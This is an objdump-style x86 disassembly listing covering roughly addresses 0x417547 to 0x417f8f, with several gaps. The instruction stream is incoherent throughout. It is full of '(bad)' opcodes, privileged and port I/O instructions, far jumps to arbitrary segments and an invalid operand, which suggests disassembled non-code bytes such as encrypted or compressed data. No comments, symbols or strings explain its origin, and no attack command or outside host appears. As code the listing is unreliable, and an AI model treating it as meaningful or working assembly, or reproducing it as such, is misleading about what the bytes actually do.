  417547:	lea    esp,ds:0xf0231f7d
  41754d:	mov    DWORD PTR [ebx-0x1e],esi
  417550:	jo     0x417541
  417552:	jbe    0x41752a
  417554:	add    BYTE PTR [eax],ah
  417556:	dec    edx
  417557:	loope  0x41755b
  417559:	push   0x3623e7b8
  41755e:	rcl    BYTE PTR [esi+ecx*1-0x78],cl
  417562:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417563:	mov    DWORD PTR [eax],ebx
  417565:	mov    ebp,0xc50c99e9
  41756a:	inc    esp
  41756b:	dec    ebp
  41756c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41756d:	add    edi,DWORD PTR ds:0xbd02994
  417573:	mov    WORD PTR [ecx-0x4a57048],cs
  417579:	ins    DWORD PTR es:[edi],dx
  41757a:	sbb    al,0xb6
  41757c:	add    dh,BYTE PTR [edx+0x5d2838a6]
  417582:	hlt    
  417583:	sub    eax,DWORD PTR [edx]
  417585:	xchg   ebp,eax
  417586:	imul   esp,DWORD PTR fs:[eax],0x6f
  41758a:	imul   edi,DWORD PTR [ecx-0x776d3fdd],0x63
  417591:	sub    BYTE PTR [ebx-0x76],al
  417594:	mov    ecx,0x8530a2cf
  417599:	add    DWORD PTR ds:0x42c8ea13,ebp
  41759f:	mov    ds:0xb2494234,eax
  4175a4:	loope  0x4175fd
  4175a6:	test   eax,0x2bd1f770
  4175ab:	adc    eax,0x6821cfe5
  4175b0:	adc    BYTE PTR [ebx+ebp*1],dh
  4175b3:	mov    cl,0x22
	...
  417615:	add    BYTE PTR [ecx-0x20b02c99],ch
  41761b:	(bad)  
  41761c:	mov    ebp,0x670b0ae7
  417621:	fsub   DWORD PTR [edx]
  417623:	adc    dl,bh
  417625:	add    al,dh
  417627:	hlt    
  417628:	add    BYTE PTR [eax],al
  41762a:	pop    es
  41762b:	add    DWORD PTR [eax],eax
  41762d:	add    BYTE PTR ds:0xce7f09a2,ch
  417633:	pushf  
  417634:	xlat   BYTE PTR ds:[ebx]
  417635:	call   0xfb9a:0x4518c410
  41763c:	or     al,0x5d
  41763e:	xchg   ebp,eax
  41763f:	rcr    DWORD PTR [ebx-0x45],cl
  417642:	mov    eax,0x77a5a8b7
  417647:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417648:	ins    DWORD PTR es:[edi],dx
  417649:	mov    edx,0x5147db3f
  41764e:	faddp  st(3),st
  417650:	cmp    esi,DWORD PTR [ebp-0x45]
  417653:	leave  
  417654:	dec    ebp
  417655:	mov    dl,0xa6
  417657:	daa    
  417658:	xor    al,0xfd
  41765a:	fldcw  WORD PTR [edx-0xd]
  41765d:	pop    ebp
  41765e:	and    DWORD PTR [ebx-0x6b],ebp
  417661:	adc    eax,0x1cd3e4ba
  417666:	retf   
  417667:	fbld   TBYTE PTR [ebx+0x1a705fc7]
  41766d:	fild   DWORD PTR [eax]
  41766f:	fcom   QWORD PTR ds:0x201f36a2
  417675:	push   eax
  417676:	(bad)  
  417677:	sub    DWORD PTR [ebx],ebx
  417679:	mov    esp,ecx
  41767b:	jae    0x417641
  41767d:	stos   BYTE PTR es:[edi],al
  41767e:	xchg   edx,eax
  41767f:	and    ebx,esi
  417681:	xchg   edx,eax
  417682:	sbb    edx,DWORD PTR [eax+0x44b3c4fe]
  417688:	hlt    
  417689:	cs out 0x23,eax
  41768c:	(bad)  
  41768d:	neg    DWORD PTR [ebx+0x38920f58]
  417693:	stos   DWORD PTR es:[edi],eax
  417694:	mov    bh,0x3a
  417696:	inc    esp
  417697:	fnsave [eax+0x72]
  41769a:	pushf  
  41769b:	mov    al,0x88
  41769d:	stos   BYTE PTR es:[edi],al
  41769e:	sbb    DWORD PTR [edx],ebp
  4176a0:	mul    cl
  4176a2:	ss cs pusha 
  4176a5:	and    esi,ebp
  4176a7:	and    edi,DWORD PTR [ecx]
  4176a9:	and    DWORD PTR [ebx-0x9674b6],eax
  4176af:	push   es
  4176b0:	xchg   edx,eax
  4176b1:	ins    DWORD PTR es:[edi],dx
  4176b2:	mov    cl,0xc9
  4176b4:	ror    DWORD PTR [ebp+0x67a355ed],cl
  4176ba:	cmp    al,0x6
  4176bc:	cmovbe ebx,DWORD PTR [eax+0xf582485]
  4176c3:	jmp    0x2383:0x72102c15
  4176ca:	adc    ebp,DWORD PTR [edi]
  4176cc:	and    DWORD PTR [esi-0x6eb83064],edx
  4176d2:	sahf   
  4176d3:	jmp    0x4176c9
  4176d5:	or     eax,0x9e420886
  4176da:	mov    edi,ebx
  4176dc:	or     ch,bl
  4176de:	sbb    eax,0x5f5e4f59
  4176e3:	rcl    BYTE PTR [ecx],cl
  4176e5:	cwde   
  4176e6:	inc    bl
  4176e8:	mov    DWORD PTR [esi+0x6e],ecx
  4176eb:	fdiv   DWORD PTR [edi-0x42]
  4176ee:	mov    bh,0x64
  4176f0:	xchg   ah,dh
  4176f2:	sar    ebx,1
  4176f4:	xchg   esp,eax
  4176f5:	lods   eax,DWORD PTR ds:[esi]
  4176f6:	push   0xffffffd4
  4176f8:	push   ebp
  4176f9:	dec    edi
  4176fa:	push   0x3c
  4176fc:	xchg   BYTE PTR [eax+0x2a],bl
  4176ff:	cmp    BYTE PTR [eax-0x10],ch
  417702:	cld    
  417703:	popa   
  417704:	(bad)  
  417705:	mov    eax,0xca1aff94
  41770a:	dec    ecx
  41770b:	(bad)  
  41770c:	sub    edx,DWORD PTR [ecx+0x1140d380]
  417712:	pop    ebp
  417713:	xlat   BYTE PTR ds:[ebx]
  417714:	cs jge 0x417751
  417717:	jae    0x417770
  417719:	and    BYTE PTR ds:0x42378694,al
  41771f:	mov    WORD PTR [ebx],gs
  417721:	mov    cl,0x32
  417723:	cwde   
  417724:	cmp    esp,DWORD PTR [eax+0x3c2cf159]
  41772a:	mov    ecx,0x971519d5
  41772f:	cmp    BYTE PTR [edx+eiz*2-0x63],0xbd
  417734:	jp     0x417736
	...
  417796:	jmp    0xff5975a9
  41779b:	imul   ecx
  41779d:	(bad)  
  41779e:	mov    bh,0x89
  4177a0:	jmp    0x4177bb
  4177a2:	or     dl,0x38
  4177a5:	das    
  4177a6:	div    ebp
  4177a8:	add    BYTE PTR [eax],al
  4177aa:	pop    es
  4177ab:	add    DWORD PTR [eax],eax
  4177ad:	add    al,ah
  4177af:	fld    QWORD PTR [ebx]
  4177b1:	adc    BYTE PTR [eax+0x6b],dh
  4177b4:	loope  0x41775a
  4177b6:	pop    ebx
  4177b7:	mov    ds:0x38256563,al
  4177bc:	mov    esp,0x3f10115e
  4177c1:	or     BYTE PTR [ebx-0x2120819e],bh
  4177c7:	gs and al,0xbd
  4177ca:	pop    ds
  4177cb:	sbb    BYTE PTR [edi],cl
  4177cd:	xor    esp,DWORD PTR [ebx-0x70]
  4177d0:	loopne 0x417824
  4177d2:	dec    ecx
  4177d3:	cwde   
  4177d4:	dec    esp
  4177d5:	imul   ecx,DWORD PTR ss:[ecx],0xfffffff0
  4177d9:	dec    edi
  4177da:	rcr    cl,cl
  4177dc:	test   DWORD PTR [ebx-0x3ce135f9],ebx
  4177e2:	sub    eax,0x5f02010c
  4177e7:	rol    BYTE PTR [eax+0x1e952c0c],0x51
  4177ee:	popa   
  4177ef:	popa   
  4177f0:	sub    bh,BYTE PTR [edx+0x34]
  4177f3:	sub    al,0xad
  4177f5:	xchg   edi,eax
  4177f6:	(bad)  
  4177f7:	xchg   edx,eax
  4177f8:	jg     0x4177af
  4177fa:	push   edi
  4177fb:	cs mov cl,0x7d
  4177fe:	clc    
  4177ff:	sbb    eax,0x687f30f0
  417804:	pop    eax
  417805:	rcl    DWORD PTR [esi+0x18],0x78
  417809:	and    cl,bh
  41780b:	cmp    edx,DWORD PTR [ebx-0x5bad7aef]
  417811:	inc    ecx
  417812:	sbb    esi,edx
  417814:	add    bh,BYTE PTR [esi+0x29]
  417817:	mov    esp,ebp
  417819:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41781a:	stc    
  41781b:	je     0x4177f8
  41781d:	mov    WORD PTR [eax+0xb],ss
  417820:	or     BYTE PTR [edi-0x5b319bbb],dh
  417826:	dec    ebp
  417827:	sub    eax,0x5ac786c0
  41782c:	mov    dh,0x1a
  41782e:	test   DWORD PTR [edx+esi*8+0xb979398],edx
  417835:	mov    al,ds:0xf258b540
  41783a:	xor    esi,ebx
  41783c:	test   eax,0xc52c9be4
  417841:	cld    
  417842:	push   es
  417843:	aaa    
  417844:	or     ecx,DWORD PTR [edx]
  417846:	jl     0x41782e
  417848:	add    al,0xe7
  41784a:	je     0x4177d3
  41784c:	or     ecx,edx
  41784e:	xchg   BYTE PTR [edi+ebp*2+0x49],dh
  417852:	push   es
  417853:	add    esp,DWORD PTR [esi]
  417855:	(bad)  
  417856:	js     0x417867
  417858:	fwait
  417859:	adc    BYTE PTR [edi+0x33c33787],0x75
  417860:	dec    esi
  417861:	and    BYTE PTR [eax+0x651297b],dl
  417867:	jmp    0xfd09:0x97816952
  41786e:	xor    eax,0x8fc64644
  417873:	aas    
  417874:	cs sub eax,0x4f8a3cdd
  41787a:	jge    0x417836
  41787c:	adc    ah,cl
  41787e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41787f:	repnz mov ah,BYTE PTR [ebp-0x2daf1583]
  417886:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417887:	and    al,0xcf
  417889:	lock loopne 0x41784f
  41788c:	push   0x988825a3
  417891:	mov    fs,WORD PTR [esi+edx*8+0x9]
  417895:	or     cl,cl
  417897:	mov    edx,0x47e35513
  41789c:	jae    0x417880
  41789e:	das    
  41789f:	out    dx,al
  4178a0:	mov    esi,0x5ee65d1f
  4178a5:	(bad)  
  4178a6:	into   
  4178a7:	loop   0x417925
  4178a9:	js     0x4178df
  4178ab:	int3   
  4178ac:	jle    0x4178db
  4178ae:	xchg   esi,eax
  4178af:	getsec 
  4178b1:	dec    eax
  4178b2:	out    dx,al
  4178b3:	fcomp  QWORD PTR [ebx]
	...
  417915:	add    BYTE PTR [eax+0x41],bl
  417918:	pop    ds
  417919:	lods   eax,DWORD PTR ds:[esi]
  41791a:	pop    ds
  41791b:	(bad)  
  41791c:	cli    
  41791d:	cmc    
  41791e:	mov    edi,0x1a60e3bb
  417923:	push   edx
  417924:	outs   dx,BYTE PTR ds:[esi]
  417925:	pop    ebx
  417926:	(bad)  
  417927:	test   BYTE PTR [eax],0x0
  41792a:	pop    es
  41792b:	add    DWORD PTR [eax],eax
  41792d:	add    BYTE PTR [eax],ah
  41792f:	cs xchg edi,eax
  417931:	aad    0xcc
  417933:	add    edi,eax
  417935:	repnz sti 
  417937:	retf   0x875b
  41793a:	rol    DWORD PTR [edi+eax*2+0x212fcbc2],1
  417941:	push   ebp
  417942:	faddp  st(6),st
  417944:	into   
  417945:	inc    ebp
  417946:	dec    eax
  417947:	aas    
  417948:	pop    ebp
  417949:	jbe    0x417974
  41794b:	(bad)  
  41794d:	mov    eax,0xea375166
  417952:	jl     0x41799a
  417954:	sub    BYTE PTR [ecx],cl
  417956:	xchg   esp,eax
  417957:	inc    edx
  417958:	add    al,0x7d
  41795a:	ret    
  41795b:	sub    al,0x9b
  41795d:	dec    eax
  41795e:	cmp    eax,ebx
  417960:	xchg   DWORD PTR [ecx+eax*2],edi
  417963:	sub    DWORD PTR [ebp+ebx*4+0x1fc75091],0xffffffe7
  41796b:	loope  0x41796a
  41796d:	pop    ebx
  41796e:	stos   DWORD PTR es:[edi],eax
  41796f:	add    dh,BYTE PTR [esi]
  417971:	dec    esi
  417972:	jp     0x41796c
  417974:	sub    eax,0x33d7fbdf
  417979:	push   esp
  41797a:	cld    
  41797b:	jecxz  0x41792f
  41797d:	sub    bl,0x21
  417980:	mov    dl,0x89
  417982:	aad    0x1b
  417984:	or     eax,0x383a57ec
  417989:	(bad)  
  41798a:	mov    eax,ds:0x5b7e2cd5
  41798f:	jae    0x41796a
  417991:	sbb    ch,BYTE PTR [ebx+0x7904b157]
  417997:	xchg   edx,eax
  417998:	and    al,0xe6
  41799a:	or     al,0x57
  41799c:	mov    ds:0x99252a21,al
  4179a1:	je     0x417a05
  4179a3:	push   eax
  4179a4:	xchg   esp,eax
  4179a5:	xchg   BYTE PTR ds:0xa3be6bc9,ch
  4179ab:	xor    cl,ch
  4179ad:	test   BYTE PTR [esp+eax*8+0x1162fcb1],cl
  4179b4:	inc    ecx
  4179b5:	pop    ss
  4179b6:	mov    ebp,0x324a8525
  4179bb:	pop    edx
  4179bc:	inc    edx
  4179bd:	mov    cl,0xe8
  4179bf:	sbb    ecx,DWORD PTR [eax+0x18]
  4179c2:	xor    al,0xe3
  4179c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179c5:	push   ebx
  4179c6:	push   ds
  4179c7:	mov    ss,esi
  4179c9:	adc    BYTE PTR [ebp+0x56],ch
  4179cc:	int    0x52
  4179ce:	(bad)  
  4179cf:	bound  ebx,QWORD PTR [edi]
  4179d1:	daa    
  4179d2:	adc    BYTE PTR [ecx+ecx*1],bl
  4179d5:	int3   
  4179d6:	xchg   edi,eax
  4179d7:	mov    eax,ds:0x45faeedf
  4179dc:	mov    ebx,DWORD PTR [esi-0x2827e221]
  4179e2:	and    al,0xf9
  4179e4:	cmp    bl,BYTE PTR [eax]
  4179e6:	cs push esi
  4179e8:	mov    eax,0xfaff2883
  4179ed:	mov    ch,BYTE PTR [edx]
  4179ef:	mov    ?,WORD PTR [edi]
  4179f1:	mov    esp,0xb9a0cd68
  4179f6:	add    esi,DWORD PTR [ecx]
  4179f8:	mov    eax,ds:0x8664ac25
  4179fd:	adc    al,0x2e
  4179ff:	cmp    eax,0xa1465ab
  417a04:	aas    
  417a05:	push   cs
  417a06:	jmp    0x8d2e2611
  417a0b:	and    BYTE PTR [eax],ch
  417a0d:	rcr    BYTE PTR [ebx-0x6fcf4e61],1
  417a13:	jo     0x4179a1
  417a15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a16:	call   0x965e:0x2a73b8fa
  417a1d:	xor    al,BYTE PTR [esi]
  417a1f:	shl    al,cl
  417a21:	ins    DWORD PTR es:[edi],dx
  417a22:	dec    edx
  417a23:	fs mov ah,0x62
  417a26:	cli    
  417a27:	in     eax,0x26
  417a29:	stos   BYTE PTR es:[edi],al
  417a2a:	int3   
  417a2b:	dec    eax
  417a2c:	add    eax,0xd05a2b5a
  417a31:	sub    BYTE PTR [eax+0x5e],dh
  417a34:	pop    ds
	...
  417a95:	add    BYTE PTR [edi],ch
  417a97:	stos   DWORD PTR es:[edi],eax
  417a98:	cdq    
  417a99:	inc    ecx
  417a9a:	popf   
  417a9b:	jae    0x417a9c
  417a9d:	out    dx,eax
  417a9e:	pop    ebx
  417a9f:	dec    edx
  417aa0:	add    edi,DWORD PTR [ecx-0x3b]
  417aa3:	int    0xd3
  417aa5:	push   esi
  417aa6:	add    eax,0x70000f8
  417aab:	add    DWORD PTR [eax],eax
  417aad:	add    bl,bh
  417aaf:	mov    ah,0xb9
  417ab1:	(bad)  
  417ab2:	mov    cl,0x35
  417ab4:	mov    al,0xcb
  417ab6:	out    0x69,al
  417ab8:	scas   al,BYTE PTR es:[edi]
  417ab9:	imul   edx,DWORD PTR [edx-0x60],0xd633435c
  417ac0:	pop    ss
  417ac1:	adc    DWORD PTR [edx],ebx
  417ac3:	scas   eax,DWORD PTR es:[edi]
  417ac4:	pop    ss
  417ac5:	xchg   ebp,ebp
  417ac7:	add    edi,esi
  417ac9:	fld    DWORD PTR [esi]
  417acb:	icebp  
  417acc:	add    WORD PTR [ebx],bx
  417acf:	sub    dl,BYTE PTR [esi-0x62]
  417ad2:	pop    ebp
  417ad3:	inc    ecx
  417ad4:	ror    BYTE PTR [ebp-0x4],1
  417ad7:	das    
  417ad8:	outs   dx,BYTE PTR ds:[esi]
  417ad9:	retf   0xed9d
  417adc:	out    dx,eax
  417add:	push   0xffffffe9
  417adf:	out    dx,eax
  417ae0:	data16 hlt 
  417ae2:	das    
  417ae3:	mov    dl,0xf4
  417ae5:	ja     0x417b55
  417ae7:	scas   eax,DWORD PTR es:[edi]
  417ae8:	aaa    
  417ae9:	fst    QWORD PTR ds:[edi]
  417aec:	retf   
  417aed:	je     0x417ae8
  417aef:	cmp    edx,esp
  417af1:	stos   DWORD PTR es:[edi],eax
  417af2:	jns    0x417b4e
  417af4:	in     eax,dx
  417af5:	jns    0x417ab4
  417af7:	gs cmp ebx,DWORD PTR es:[eax-0x7d6db2c9]
  417aff:	aas    
  417b00:	sti    
  417b01:	test   BYTE PTR [esi-0x5d],bh
  417b04:	sub    DWORD PTR [edi+0x44],edi
  417b07:	and    BYTE PTR [edi-0x70892ddd],0x28
  417b0e:	adc    bh,bh
  417b10:	fnstsw WORD PTR [edi]
  417b12:	adc    ch,BYTE PTR [esi+eiz*2+0x7b]
  417b16:	xchg   ecx,eax
  417b17:	push   ebp
  417b18:	bound  edi,QWORD PTR [eax+0x31]
  417b1b:	cmp    esi,DWORD PTR [ebx]
  417b1d:	js     0x417b74
  417b1f:	mov    ds:0x338d0837,al
  417b24:	popf   
  417b25:	gs or  ah,ch
  417b28:	call   0xd337e8b2
  417b2d:	leave  
  417b2e:	sub    ebx,DWORD PTR [edx*8-0x37438757]
  417b35:	xchg   esp,eax
  417b36:	adc    BYTE PTR [edx-0x68],dh
  417b39:	int3   
  417b3a:	push   0x36b85f66
  417b3f:	jnp    0x417b1f
  417b41:	xchg   ecx,eax
  417b42:	sar    BYTE PTR [esp+ebx*8],0xb4
  417b46:	outs   dx,DWORD PTR ds:[esi]
  417b47:	xchg   BYTE PTR [eax-0x27],bh
  417b4a:	call   0xb4097bbe
  417b4f:	fld    TBYTE PTR [edx+edx*4-0x4cbca85b]
  417b56:	lods   al,BYTE PTR ds:[esi]
  417b57:	and    eax,ebx
  417b59:	(bad)
  417b5c:	outs   dx,DWORD PTR ds:[esi]
  417b5d:	mov    al,ds:0x74ab28c9
  417b62:	iret   
  417b63:	jg     0x417bc6
  417b65:	jns    0x417b61
  417b67:	jle    0x417bdc
  417b69:	inc    esp
  417b6a:	pusha  
  417b6b:	fisubr WORD PTR [esi+0x4faa70f2]
  417b71:	ja     0xd44a753f
  417b77:	pushf  
  417b78:	lods   eax,DWORD PTR ds:[esi]
  417b79:	push   eax
  417b7a:	mov    ecx,0x94a9600d
  417b7f:	pop    ecx
  417b80:	sub    eax,0x31e8ebfd
  417b85:	dec    edi
  417b86:	in     al,0x26
  417b88:	push   0xc96d2524
  417b8d:	push   edi
  417b8e:	fdivr  QWORD PTR [ecx+0x4a5dfc90]
  417b94:	(bad)  
  417b95:	or     eax,0xfdb2db84
  417b9a:	jmp    0x63ffee10
  417b9f:	lods   eax,DWORD PTR ds:[esi]
  417ba0:	sub    eax,esp
  417ba2:	enter  0xa86c,0xca
  417ba6:	call   0xb79e1be2
  417bab:	cmp    dl,BYTE PTR [ecx]
  417bad:	mov    ebx,0x48644cc8
  417bb2:	adc    eax,0x6d99
	...
  417c13:	add    BYTE PTR [eax],al
  417c15:	add    BYTE PTR [ecx-0x267b6f40],cl
  417c1b:	aam    0x9d
  417c1d:	int    0xb0
  417c1f:	mov    ah,BYTE PTR [ebx]
  417c21:	mov    al,0xec
  417c23:	push   eax
  417c24:	cmc    
  417c25:	and    eax,0xf90c
  417c2a:	pop    es
  417c2b:	add    DWORD PTR [eax],eax
  417c2d:	add    BYTE PTR [ebx],dh
  417c2f:	cmp    DWORD PTR [ebx+0x7],edi
  417c32:	push   es
  417c33:	mov    al,ds:0x15a868aa
  417c38:	push   edi
  417c39:	(bad)  
  417c3b:	popa   
  417c3c:	sub    eax,DWORD PTR [ebp+eiz*1+0x12]
  417c40:	hlt    
  417c41:	fcom   DWORD PTR [ebp-0xe]
  417c44:	cs es xchg edi,eax
  417c47:	adc    eax,0xee9b1622
  417c4c:	into   
  417c4d:	and    al,0x57
  417c4f:	mov    esi,0xfcd78a76
  417c54:	nop
  417c55:	outs   dx,DWORD PTR ds:[esi]
  417c56:	sbb    eax,0xbcd0a975
  417c5b:	sub    BYTE PTR [edi],ah
  417c5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c5e:	jmp    0x3522:0x2d0b6438
  417c65:	out    0x3,al
  417c67:	xchg   BYTE PTR [ebx+eiz*4],dl
  417c6a:	int3   
  417c6b:	sbb    eax,0x5227d92
  417c70:	xchg   ebx,eax
  417c71:	inc    edi
  417c72:	pusha  
  417c73:	shr    bl,1
  417c75:	dec    ebp
  417c76:	imul   edx,DWORD PTR [edx-0x5291414d],0x6b
  417c7d:	aam    0x43
  417c7f:	sub    ebx,edx
  417c81:	xchg   esi,eax
  417c82:	jnp    0x417ce7
  417c84:	cmp    al,dh
  417c86:	mov    ah,0x45
  417c88:	pushf  
  417c89:	rcr    bl,0xf6
  417c8c:	mov    ch,0x45
  417c8e:	stc    
  417c8f:	lock fidivr WORD PTR [ebx]
  417c92:	(bad)  
  417c94:	and    ah,BYTE PTR [edx]
  417c96:	icebp  
  417c97:	shr    BYTE PTR [ebx+0x26e56d8f],cl
  417c9d:	push   edx
  417c9e:	add    al,0x67
  417ca0:	sub    BYTE PTR [ebp+0x6f2ca6ec],0x3c
  417ca7:	add    edx,esp
  417ca9:	mov    esi,fs
  417cab:	pop    edx
  417cac:	aas    
  417cad:	jg     0x417d1e
  417caf:	pusha  
  417cb0:	pop    ss
  417cb1:	sbb    edx,DWORD PTR [ebx]
  417cb3:	push   esi
  417cb4:	and    ebp,edi
  417cb6:	ins    BYTE PTR es:[edi],dx
  417cb7:	jns    0x417cc1
  417cb9:	icebp  
  417cba:	mov    cl,0xa1
  417cbc:	xchg   esp,eax
  417cbd:	lods   al,BYTE PTR ds:[esi]
  417cbe:	pop    ss
  417cbf:	out    dx,al
  417cc0:	jecxz  0x417ca2
  417cc2:	jmp    0x4357:0xc38c8144
  417cc9:	jnp    0x417cad
  417ccb:	sbb    ebp,DWORD PTR [ebx+0x3e56f54]
  417cd1:	mov    DWORD PTR [ebp-0xd],esi
  417cd4:	xchg   edi,eax
  417cd5:	mov    eax,0x40160030
  417cda:	retf   
  417cdb:	cwde   
  417cdc:	fst    QWORD PTR ds:0xc047684
  417ce2:	lds    eax,FWORD PTR [esi+ebp*2-0x897f5e0]
  417ce9:	push   ebx
  417cea:	mov    dl,0xae
  417cec:	out    0xa0,al
  417cee:	push   edi
  417cef:	sbb    eax,0x66b64731
  417cf4:	cwde   
  417cf5:	jbe    0x417c90
  417cf7:	xchg   ecx,edx
  417cf9:	lds    edx,FWORD PTR [ecx+0x332adfd0]
  417cff:	jmp    0xe1aa:0x35d5f166
  417d06:	push   esp
  417d07:	mov    al,fs:0x9ae2aa9a
  417d0d:	mov    ecx,0x531e3ece
  417d12:	cdq    
  417d13:	popa   
  417d14:	sbb    edx,DWORD PTR [edi-0x31]
  417d17:	dec    ebx
  417d18:	mov    ebp,0x12f2dbcf
  417d1d:	cld    
  417d1e:	test   ebx,ebx
  417d20:	xor    al,0x90
  417d22:	(bad)  
  417d23:	adc    al,0x41
  417d25:	(bad)  
  417d26:	loope  0x417d32
  417d28:	(bad)  
  417d29:	xchg   esp,eax
  417d2a:	add    BYTE PTR ds:0xc8c67fbe,ch
  417d30:	stos   DWORD PTR es:[edi],eax
  417d31:	jecxz  0x417d7d
  417d33:	mov    esi,0xd4
	...
  417d94:	add    BYTE PTR [eax],al
  417d96:	pop    ss
  417d97:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417d9d:	addr16 ret 
  417d9f:	add    DWORD PTR [ebx],esp
  417da1:	mov    ah,0x3
  417da3:	mov    ch,0xe4
  417da5:	pop    eax
  417da6:	adc    edi,edx
  417da8:	add    BYTE PTR [eax],al
  417daa:	pop    es
  417dab:	add    DWORD PTR [eax],eax
  417dad:	add    BYTE PTR [esi-0x2a360432],ch
  417db3:	rcr    BYTE PTR [ebx-0x31],1
  417db6:	sub    BYTE PTR [ecx-0x4a299642],al
  417dbc:	ins    BYTE PTR es:[edi],dx
  417dbd:	cli    
  417dbe:	js     0x417d7e
  417dc0:	outs   dx,BYTE PTR ds:[esi]
  417dc1:	mov    bl,BYTE PTR [eax+edx*2-0x67]
  417dc5:	sti    
  417dc6:	add    al,0x23
  417dc8:	ins    DWORD PTR es:[edi],dx
  417dc9:	retf   0xb10b
  417dcc:	scas   eax,DWORD PTR es:[edi]
  417dcd:	mov    dh,0x53
  417dcf:	dec    ebp
  417dd0:	inc    edi
  417dd1:	(bad)
  417dd4:	jb     0x417e06
  417dd6:	cli    
  417dd7:	mov    gs:0xe84bab58,eax
  417ddd:	call   0xae45d60
  417de2:	dec    edx
  417de3:	in     al,0xfe
  417de5:	arpl   WORD PTR [eax+0x20],sp
  417de8:	xor    eax,0x60ec6ae8
  417ded:	jle    0x417de6
  417def:	mov    ch,0xb5
  417df1:	sub    BYTE PTR [ecx+edx*2+0x19],bh
  417df5:	stos   DWORD PTR es:[edi],eax
  417df6:	push   0x9073432b
  417dfb:	dec    ax
  417dfd:	xor    eax,0x6e38b2a0
  417e02:	jp     0x417e05
  417e04:	repz aam 0x8c
  417e07:	jp     0x417e6b
  417e09:	ret    
  417e0a:	addr16 in eax,0x21
  417e0d:	jb     0x417dce
  417e0f:	clc    
  417e10:	imul   ecx,DWORD PTR [eax-0x2c],0x70e23de8
  417e17:	dec    esp
  417e18:	rcl    BYTE PTR [ebp+0x77ce77f2],0x81
  417e1f:	xchg   edx,eax
  417e20:	push   ebx
  417e21:	inc    ebp
  417e22:	mov    ds:0x46c2e8a1,eax
  417e27:	(bad)  
  417e28:	in     al,dx
  417e29:	xchg   ecx,eax
  417e2a:	pushf  
  417e2b:	cmc    
  417e2c:	data16 fisubr DWORD PTR [esi+0x7c6872af]
  417e33:	icebp  
  417e34:	and    al,0x41
  417e36:	mov    ss,edi
  417e38:	add    dh,ah
  417e3a:	les    ebp,FWORD PTR [ecx]
  417e3c:	mov    ecx,0xd7c29bf4
  417e41:	xchg   ebx,eax
  417e42:	das    
  417e43:	imul   ebp,ebx,0x37
  417e46:	mov    dh,0x6e
  417e48:	dec    eax
  417e49:	sub    al,0xe2
  417e4b:	xor    esi,ecx
  417e4d:	push   esp
  417e4e:	inc    ebx
  417e4f:	mov    ecx,0x4c4229be
  417e54:	cdq    
  417e55:	int3   
  417e56:	ss scas eax,DWORD PTR es:[edi]
  417e58:	nop
  417e59:	int    0x85
  417e5b:	fst    st(1)
  417e5d:	cmp    al,0xce
  417e5f:	imul   esi,DWORD PTR [ecx-0x50],0x7f
  417e63:	stc    
  417e64:	jbe    0x417e46
  417e66:	mov    DWORD PTR [eax+0x54910eb9],edx
  417e6c:	xlat   BYTE PTR ds:[ebx]
  417e6d:	int3   
  417e6e:	hlt    
  417e6f:	adc    ebp,DWORD PTR [edi]
  417e71:	xchg   ecx,eax
  417e72:	mov    WORD PTR [edi],ss
  417e74:	into   
  417e75:	adc    BYTE PTR [ebp-0xa],bl
  417e78:	pop    ebp
  417e79:	ror    BYTE PTR [edx-0x4a],0x75
  417e7d:	cmp    bh,cl
  417e7f:	lods   al,BYTE PTR ds:[esi]
  417e80:	pop    ecx
  417e81:	sub    al,0x36
  417e83:	mov    bh,0xe8
  417e85:	mov    bl,0x36
  417e87:	repnz in eax,dx
  417e89:	mov    esp,0x4246b528
  417e8e:	mov    al,0xe0
  417e90:	mov    ds:0xaae92e86,eax
  417e95:	push   es
  417e96:	inc    esi
  417e97:	bound  ecx,QWORD PTR [esi-0x60f0c6e]
  417e9d:	jmp    0x4fe47153
  417ea2:	and    al,0x2d
  417ea4:	mov    bh,0x49
  417ea6:	sub    dl,BYTE PTR [eax]
  417ea8:	mov    al,ds:0xb008d57
  417ead:	add    dl,BYTE PTR [edx-0x63956c1b]
  417eb3:	repnz aad 0x0
	...
  417f16:	(bad)  
  417f17:	out    0xe6,al
  417f19:	cmp    esp,esi
  417f1b:	cmp    edi,edi
  417f1d:	push   DWORD PTR [esi+0x1b]
  417f20:	ja     0x417ec6
  417f22:	mov    al,ds:0x1a32e4a5
  417f27:	sti    
  417f28:	add    BYTE PTR [eax],al
  417f2a:	pop    es
  417f2b:	add    DWORD PTR [eax],eax
  417f2d:	add    BYTE PTR [edi-0x43c5aa57],dl
  417f33:	fwait
  417f34:	test   al,0x35
  417f36:	or     eax,0x8592277c
  417f3b:	push   0x7ed091ea
  417f40:	hlt    
  417f41:	add    ch,BYTE PTR [edx-0x6a]
  417f44:	jns    0x417fac
  417f46:	clc    
  417f47:	add    DWORD PTR [edi+0x114303ad],ebp
  417f4d:	inc    ebp
  417f4e:	mov    BYTE PTR [ebp+0x44],0x7c
  417f52:	add    ch,dl
  417f54:	xchg   ebx,eax
  417f55:	inc    esi
  417f56:	pop    ebp
  417f57:	jmp    0x6f8b:0x7e3d0498
  417f5e:	je     0x417fd4
  417f60:	hlt    
  417f61:	adc    al,0x87
  417f63:	rcl    DWORD PTR [edi],1
  417f65:	data16 clc 
  417f67:	jecxz  0x417f75
  417f69:	test   BYTE PTR [edx+0x2a],al
  417f6c:	xlat   BYTE PTR ds:[ebx]
  417f6d:	mov    dl,BYTE PTR [ebp+0x29003b7b]
  417f73:	dec    esp
  417f74:	repz push cs
  417f76:	and    cl,BYTE PTR [esi]
  417f78:	add    esi,ebp
  417f7a:	cmp    edi,ebp
  417f7c:	mov    edx,DWORD PTR [ecx-0x7d]
  417f7f:	and    esi,DWORD PTR [ecx]
  417f81:	iret   
  417f82:	std    
  417f83:	pushf  
  417f84:	xor    eax,0xff0fe3b
  417f89:	mov    DWORD PTR [ebp-0x7f],eax
  417f8c:	push   edx
  417f8d:	and    dl,cl
  417f8f:	and    BYTE PTR [ecx+ebx*2-0x319037bf],ch
